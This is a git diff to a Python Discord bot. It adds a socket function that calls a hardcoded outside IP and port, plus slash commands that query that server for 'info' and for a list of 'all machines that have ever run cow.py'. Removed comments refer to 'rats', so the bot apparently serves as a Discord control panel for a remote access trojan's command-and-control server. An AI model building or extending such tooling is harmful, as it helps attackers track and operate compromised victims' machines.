@@ -4,6 +4,18 @@ from discord import app_commands
 import logging
 from dotenv import load_dotenv
 import os
+import socket
+
+def connect(command):
+    ip = '3.26.216.143'
+    port = 4570
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.connect((ip, port))
+
+    server.send(command.encode())
+    response = server.recv(4096).decode()
+    server.close()
+    return response
 
 load_dotenv()
 token = os.getenv('DISCORD_TOKEN')
@@ -17,16 +29,21 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 @bot.event
 async def on_ready():
     print(f"{bot.user.name} is ready!")
-    await bot.tree.sync()
+    await bot.tree.sync()   
+
+@bot.tree.command(name="getinfo", description="Get info of cows")
+async def getInfo(interaction: discord.Interaction):
+    await interaction.response.send_message("Attempting to get info...")
+
+    info = connect(":GETINFO")
     
+    # Send the result as a code block (for formatting)
+    await interaction.followup.send(f"```{info}```")
 
-@bot.tree.command(name="boos", description="boos?")
-async def boos(interaction: discord.Interaction):
-    await interaction.response.send_message("ur boos")
-
-@bot.tree.command(name="cows", description="list out the list of cows available.")
-async def listRats(interaction: discord.Interaction):
-    #grab a list of rats later
-    await interaction.response.send_message("Not ready yet")
+@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
+async def listCows(interaction: discord.Interaction):
+    await interaction.response.send_message("Listing all cows ever seen...")
+    machines = connect(":LISTCOWS")
+    await interaction.followup.send(f"```{machines}```")
 
 bot.run(token, log_handler=handler, log_level=logging.DEBUG)
